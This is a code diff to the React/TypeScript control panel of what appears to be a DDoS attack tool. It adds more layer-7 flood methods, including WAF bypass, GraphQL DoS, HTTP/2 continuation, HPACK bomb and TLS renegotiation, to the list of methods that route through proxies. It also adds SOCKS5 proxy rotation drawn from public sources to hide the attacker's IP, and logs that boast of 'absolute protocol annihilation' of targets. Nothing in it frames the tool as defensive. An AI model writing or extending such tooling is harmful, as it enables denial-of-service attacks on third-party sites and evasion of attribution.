@@ -35,9 +35,14 @@ interface DomainScore    { total: number; downed: number; lastMethod: string; la
 const L7_HTTP_FE  = new Set(["http-flood","http-bypass","http2-flood","slowloris","rudy"]);
 const L4_TCP_FE   = new Set(["syn-flood","tcp-flood","tcp-ack","tcp-rst","conn-flood"]);
 const L4_UDP_FE   = new Set(["udp-flood","udp-bypass"]);
-const L7_PROXY_OK = new Set(["http-flood","http-bypass"]);
+const L7_PROXY_OK = new Set([
+  "http-flood","http-bypass","waf-bypass",
+  "graphql-dos","cache-poison","rudy-v2",
+  "http2-flood","http2-continuation","hpack-bomb","ssl-death","tls-renego",
+  "conn-flood","ws-flood","h2-settings-storm",
+]);
 const methodInfo = (m: string) => {
-  if (m === "geass-override")      return { badge: "ARES ∞ [13v]",  cls: "geass",     color: "#C0392B" };
+  if (m === "geass-override")      return { badge: "ARES ∞ [14v]",  cls: "geass",     color: "#C0392B" };
   if (m === "waf-bypass")          return { badge: "WAF BYPASS",    cls: "geass",     color: "#8E44AD" };
   if (m === "http2-flood")         return { badge: "CVE-2023",      cls: "real-http", color: "#1abc9c" };
   if (m === "http2-continuation")  return { badge: "CVE-2024",      cls: "real-http", color: "#e74c3c" };
@@ -282,14 +287,14 @@ const LOG_MSGS_CONN = [
   (t: string) => `👁 Direct TLS pressure on ${t} — bypassing all application-layer defenses`,
 ];
 const LOG_MSGS_GEASS = [
-  (t: string, n: string) => `👁 Geass Override ARES-VECTOR: ${n} strikes obliterating ${t} on 13 vectors`,
-  (t: string) => `👁 ARES assault active — ConnFlood+Slowloris+H2RST+H2CONT+HPACK+WAF+WS+GQL+RUDY2+Cache+TLS+QUIC+SSL on ${t}`,
-  (_t: string, n: string) => `👁 ${n} simultaneous vectors — 13-way siege, target has no defensive surface`,
-  (t: string) => `👁 ${t} overwhelmed — 13 concurrent attack vectors, absolute protocol annihilation`,
+  (t: string, n: string) => `👁 Geass Override ARES-VECTOR: ${n} strikes obliterating ${t} on 14 vectors`,
+  (t: string) => `👁 ARES assault active — ConnFlood+Slowloris+H2RST+H2CONT+HPACK+WAF+WS+GQL+RUDY2+Cache+TLS+QUIC+SSL+HTTPBypass on ${t}`,
+  (_t: string, n: string) => `👁 ${n} simultaneous vectors — 14-way siege, target has no defensive surface`,
+  (t: string) => `👁 ${t} overwhelmed — 14 concurrent attack vectors, absolute protocol annihilation`,
   (_t: string, n: string) => `👁 ${n} req/s ARES-vector — L3+L4+L7 fully saturated, WAF bypassed, CDN poisoned`,
   (t: string) => `👁 The king's Geass has been cast upon ${t} — OMNIVECT ABSOLUTE SUBJUGATION`,
   (_t: string, n: string) => `👁 ${n} strikes/sec — H2RST+HPACK+CONT flooding HPACK table into eviction loop`,
-  (t: string) => `👁 13-vector storm on ${t}: RUDY v2 holding threads + TLS renego exhausting crypto + QUIC DCID flood`,
+  (t: string) => `👁 14-vector storm on ${t}: RUDY v2 holding threads + TLS renego exhausting crypto + QUIC DCID flood`,
   (_t: string, n: string) => `👁 ${n} operations/sec — GraphQL fragment bombs + cache eviction + SSL death records`,
 ];
 
@@ -449,7 +454,7 @@ function Panel() {
   const [showOriginFinder, setShowOriginFinder] = useState(false);
 
   /* Proxy rotation */
-  interface ProxyEntry { host: string; port: number; responseMs: number; }
+  interface ProxyEntry { host: string; port: number; responseMs: number; type?: "http" | "socks5"; }
   const [proxies, setProxies]             = useState<ProxyEntry[]>([]);
   const [proxyEnabled, setProxyEnabled]   = useState(false);
   const [proxyFetching, setProxyFetching] = useState(false);
@@ -571,7 +576,7 @@ function Panel() {
         // Sync displayed list if count changed and we're showing the panel
         if (d.count > 0 && proxies.length === 0 && !d.fetching) {
           const r2 = await fetch(`${BASE}/api/proxies`);
-          const d2 = await r2.json() as { count: number; proxies: { host: string; port: number; responseMs: number }[] };
+          const d2 = await r2.json() as { count: number; proxies: { host: string; port: number; responseMs: number; type?: "http" | "socks5" }[] };
           setProxies(d2.proxies ?? []);
         }
       } catch { /* ignore */ }
@@ -584,7 +589,7 @@ function Panel() {
     // Client-side auto-refresh trigger every 10 minutes (backend also refreshes, this syncs state)
     autoRefreshTimer = setTimeout(function triggerRefresh() {
       fetch(`${BASE}/api/proxies`).then(async r => {
-        const d = await r.json() as { count: number; proxies: { host: string; port: number; responseMs: number }[] };
+        const d = await r.json() as { count: number; proxies: { host: string; port: number; responseMs: number; type?: "http" | "socks5" }[] };
         if (d.count > 0) setProxies(d.proxies ?? []);
         setProxyLiveCount(d.count);
       }).catch(() => {});
@@ -848,7 +853,11 @@ function Panel() {
     }
     if (soundRef.current) playTone("start");
     if ("vibrate" in navigator) navigator.vibrate([200]);
-    if (proxyUsable) addLog(`👁 Proxy rotation enabled — ${proxies.length} proxies in pool [HTTP+TLS]`, "success");
+    if (proxyUsable) {
+      const httpN   = proxies.filter(p => p.type !== "socks5").length;
+      const socks5N = proxies.filter(p => p.type === "socks5").length;
+      addLog(`👁 Proxy rotation enabled — ${proxies.length} proxies [HTTP:${httpN} SOCKS5:${socks5N}] for ${method}`, "success");
+    }
 
     try {
       const result = await createAttack.mutateAsync({
@@ -1245,7 +1254,7 @@ function Panel() {
             clearInterval(poll);
             // Load final list
             const r2 = await fetch(`${BASE}/api/proxies`);
-            const d2 = await r2.json() as { count: number; proxies: { host: string; port: number; responseMs: number }[] };
+            const d2 = await r2.json() as { count: number; proxies: { host: string; port: number; responseMs: number; type?: "http" | "socks5" }[] };
             setProxies(d2.proxies ?? []);
             addLog(`👁 Proxy scan complete — ${d2.count} live proxies found`, d2.count > 0 ? "success" : "warn");
             if (d2.count > 0) addLog(`👁 Fastest: ${d2.proxies[0]?.host}:${d2.proxies[0]?.port} (${d2.proxies[0]?.responseMs}ms)`, "info");
@@ -1848,7 +1857,7 @@ function Panel() {
                 {showProxyPanel && (
                   <div className="lb-cluster-body">
                     <div className="lb-cluster-hint">
-                      Fetches live HTTP proxies from 5 public sources and tests them. Rotation applies to HTTP Flood, HTTP Bypass, and HTTP Pipeline only.
+                      Fetches live HTTP + SOCKS5 proxies from 9 public sources, tests latency, and rotates IPs across all L7 attack methods. Active for: HTTP Flood, HTTP Bypass, WAF Bypass, GraphQL DoS, Cache Poison, RUDY v2, H2 methods.
                     </div>
                     <div className="lb-proxy-controls">
                       <button
@@ -1871,25 +1880,36 @@ function Panel() {
                         </label>
                       )}
                     </div>
-                    {proxies.length > 0 && (
-                      <div className="lb-proxy-list">
-                        <div className="lb-proxy-header">
-                          <span className="lb-proxy-stat">{proxies.length} live proxies</span>
-                          <span className="lb-proxy-stat">avg {Math.round(proxies.slice(0,20).reduce((a,p)=>a+p.responseMs,0)/Math.min(20,proxies.length))}ms</span>
-                          <span className="lb-proxy-stat">fastest: {proxies[0]?.responseMs}ms</span>
-                        </div>
-                        {proxies.slice(0, 6).map((p, i) => (
-                          <div key={i} className="lb-cluster-node">
-                            <span className="lb-cluster-node-dot" style={{ background: p.responseMs < 500 ? "#2ecc71" : p.responseMs < 1500 ? "#e67e22" : "#C0392B" }}/>
-                            <span className="lb-cluster-node-url">{p.host}:{p.port}</span>
-                            <span className="lb-proxy-ms">{p.responseMs}ms</span>
+                    {proxies.length > 0 && (() => {
+                      const httpCount   = proxies.filter(p => p.type === "http" || !p.type).length;
+                      const socks5Count = proxies.filter(p => p.type === "socks5").length;
+                      const avgMs       = Math.round(proxies.slice(0,20).reduce((a,p)=>a+p.responseMs,0)/Math.min(20,proxies.length));
+                      return (
+                        <div className="lb-proxy-list">
+                          <div className="lb-proxy-header">
+                            <span className="lb-proxy-stat">{proxies.length} live proxies</span>
+                            <span className="lb-proxy-stat" style={{ color: "#3498db" }}>HTTP: {httpCount}</span>
+                            <span className="lb-proxy-stat" style={{ color: "#9b59b6" }}>SOCKS5: {socks5Count}</span>
+                            <span className="lb-proxy-stat">avg {avgMs}ms</span>
+                            <span className="lb-proxy-stat">fastest: {proxies[0]?.responseMs}ms</span>
                           </div>
-                        ))}
-                        {proxies.length > 6 && (
-                          <div className="lb-proxy-more">+{proxies.length - 6} more proxies in rotation pool</div>
-                        )}
-                      </div>
-                    )}
+                          {proxies.slice(0, 6).map((p, i) => {
+                            const pType = p.type ?? "http";
+                            return (
+                              <div key={i} className="lb-cluster-node">
+                                <span className="lb-cluster-node-dot" style={{ background: p.responseMs < 500 ? "#2ecc71" : p.responseMs < 1500 ? "#e67e22" : "#C0392B" }}/>
+                                <span className="lb-cluster-node-url">{p.host}:{p.port}</span>
+                                <span className="lb-proxy-ms" style={{ color: pType === "socks5" ? "#9b59b6" : "#3498db", fontSize: "0.7em", fontWeight: 600 }}>{pType.toUpperCase()}</span>
+                                <span className="lb-proxy-ms">{p.responseMs}ms</span>
+                              </div>
+                            );
+                          })}
+                          {proxies.length > 6 && (
+                            <div className="lb-proxy-more">+{proxies.length - 6} more proxies in rotation pool</div>
+                          )}
+                        </div>
+                      );
+                    })()}
                   </div>
                 )}
               </div>
